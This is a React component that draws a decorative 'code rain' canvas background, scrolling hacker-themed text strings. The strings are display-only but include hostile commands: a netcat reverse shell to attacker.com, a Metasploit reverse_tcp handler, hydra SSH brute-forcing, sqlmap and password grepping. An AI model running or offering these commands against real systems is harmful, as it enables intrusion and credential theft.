import { useEffect, useRef } from 'react';
import { useTheme } from './ThemeContext';

export function CodeRainBackground() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const { theme } = useTheme();

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let width = (canvas.width = window.innerWidth);
    let height = (canvas.height = window.innerHeight);

    // Lignes de code réalistes sur le thème cybersécurité
    const codeLines = [
      'import socket, nmap, scapy',
      'def scan_network(target):',
      '    nmap -sV -O -p- 192.168.1.0/24',
      'exploit = b"\\x90" * 100',
      'from Crypto.Cipher import AES',
      'subprocess.Popen(["nc", "-lvp", "4444"])',
      'payload = shellcode + rop_chain',
      'if vulnerabilities_found:',
      '    execute_exploit(target)',
      'hashlib.sha256(password).hexdigest()',
      'requests.post(url, data=payload)',
      'os.system("chmod +x exploit.sh")',
      'buffer_overflow = "A" * 512',
      'for port in range(1, 65535):',
      '    sock.connect((host, port))',
      'metasploit > use exploit/multi/handler',
      'set PAYLOAD windows/meterpreter/reverse_tcp',
      'python3 osint_tool.py --target domain.com',
      'grep -r "password" /var/www/',
      'tcpdump -i eth0 -w capture.pcap',
      'wireshark -r network_traffic.pcap',
      'john --wordlist=rockyou.txt hash.txt',
      'hydra -l admin -P passwords.txt ssh://10.0.0.1',
      'sqlmap -u "http://target.com?id=1" --dbs',
      'nc -e /bin/sh attacker.com 4444',
      'openssl enc -aes-256-cbc -in file.txt',
      'nslookup -type=ANY target.com',
      'whois target.com | grep "Name Server"',
      'curl -X POST -d "user=admin" target.com',
      'base64 -d encoded_payload.txt',
    ];

    // Configuration des lignes de code qui défilent
    interface CodeLine {
      text: string;
      y: number;
      speed: number;
      opacity: number;
    }

    const lines: CodeLine[] = [];
    const maxLines = 20;
    const fontSize = 14;
    const lineSpacing = 30;

    // Initialisation des lignes
    for (let i = 0; i < maxLines; i++) {
      lines.push({
        text: codeLines[Math.floor(Math.random() * codeLines.length)],
        y: Math.random() * height - height,
        speed: 0.3 + Math.random() * 0.5,
        opacity: 0.1 + Math.random() * 0.3,
      });
    }

    const draw = () => {
      // Fond semi-transparent pour effet de traînée
      const bgColor = 'rgba(15, 23, 42, 0.1)'; // Toujours sombre pour correspondre au bg-slate-900
      ctx.fillStyle = bgColor;
      ctx.fillRect(0, 0, width, height);

      // Couleur du texte en cyan
      ctx.font = `${fontSize}px "Courier New", monospace`;
      ctx.textAlign = 'left';

      for (const line of lines) {
        ctx.fillStyle = `rgba(6, 182, 212, ${line.opacity})`; // red-500
        ctx.fillText(line.text, 20, line.y);

        // Déplacement vers le bas
        line.y += line.speed;

        // Réinitialisation quand la ligne sort de l'écran
        if (line.y > height + lineSpacing) {
          line.y = -lineSpacing;
          line.text = codeLines[Math.floor(Math.random() * codeLines.length)];
          line.speed = 0.3 + Math.random() * 0.5;
          line.opacity = 0.1 + Math.random() * 0.3;
        }
      }
    };

    const interval = setInterval(draw, 1000 / 60); // 60 FPS

    const handleResize = () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    };

    window.addEventListener('resize', handleResize);

    return () => {
      clearInterval(interval);
      window.removeEventListener('resize', handleResize);
    };
  }, [theme]);

  return (
    <canvas
      ref={canvasRef}
      className="absolute inset-0 pointer-events-none opacity-30 z-0"
      aria-hidden="true"
    />
  );
}